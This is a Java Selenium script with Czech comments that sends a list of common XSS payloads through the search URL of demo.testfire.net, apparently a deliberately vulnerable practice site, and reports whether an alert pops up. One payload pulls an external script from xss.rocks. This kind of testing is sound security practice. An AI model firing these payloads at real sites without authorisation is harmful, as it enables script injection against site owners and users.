package UI;

import org.openqa.selenium.Alert;
import org.openqa.selenium.NoAlertPresentException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;

import io.github.bonigarcia.wdm.WebDriverManager;

public class XSSInjectionTest {

	public static String browser = "Chrome"; // nebo "Edge"
	public static WebDriver driver;

	public static void setUpDriver() {
		if (browser.equalsIgnoreCase("Edge")) {
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else {
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		driver.manage().window().maximize();
	}

	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		setUpDriver();
		System.out.println("🧪 Spuštěn XSS Injection test na demo.testfire.net");

		// Běžné XSS payloady
		String[] xssPayloads = { "<script>alert('XSS')</script>", "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
				"<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=javascript:alert('XSS')>",
				"<IMG SRC=JaVaScRiPt:alert('XSS')>", "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
				"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
				"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
				"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "<IMG SRC=# onmouseover=\"alert('xxs')\">",
				"<IMG SRC= onmouseover=\"alert('xxs')\">", "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
				"<BODY ONLOAD=alert('XSS')>" };

		// Cílová URL pro vyhledávání
		// Poznámka: demo.testfire.net nemusí mít přímo viditelné vyhledávací pole na
		// hlavní stránce,
		// často se XSS testuje přes parametry v URL. Tento skript přistupuje přímo k
		// search.jsp.
		String targetUrlBase = "http://demo.testfire.net/search.jsp?query=";

		for (int i = 0; i < xssPayloads.length; i++) {
			String payload = xssPayloads[i];
			System.out.println("🔁 Pokus #" + (i + 1) + " s payloadem: " + payload);

			// V tomto případě vkládáme payload přímo do URL,
			// protože search.jsp na demo.testfire.net zpracovává 'query' parametr.
			// Alternativně bychom mohli najít vyhledávací pole a odeslat payload přes něj.
			driver.get(targetUrlBase + payload); // Odeslání payloadu přes GET parametr

			// Pokus o detekci alertu
			try {
				// WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(3)); //
				// Čekání max 3 sekundy
				// Alert alert = wait.until(ExpectedConditions.alertIsPresent());
				// Místo explicitního čekání zkusíme rovnou, protože některé alerty se objeví
				// ihned
				Alert alert = driver.switchTo().alert();
				String alertText = alert.getText();
				System.out.println("🚨 Možná úspěšná XSS! Alert zobrazen s textem: " + alertText);
				alert.accept(); // Zavřít alert
				// Zde bys mohl přidat `break;` pokud chceš skončit po prvním úspěchu
			} catch (NoAlertPresentException e) {
				// Pokud se alert neobjeví, můžeš ještě zkusit zkontrolovat zdrojový kód
				// stránky,
				// zda se payload odrazil v HTML (což by byl také náznak XSS, i když se skript
				// nespustil).
				// Např. if (driver.getPageSource().contains(payload)) { ... }
				System.out.println("❌ Alert se neobjevil pro tento payload.");
			}
			pause(1); // Krátká pauza mezi pokusy
		}

		pause(3);
		driver.quit();
		System.out.println("🔚 Test dokončen.");
	}
}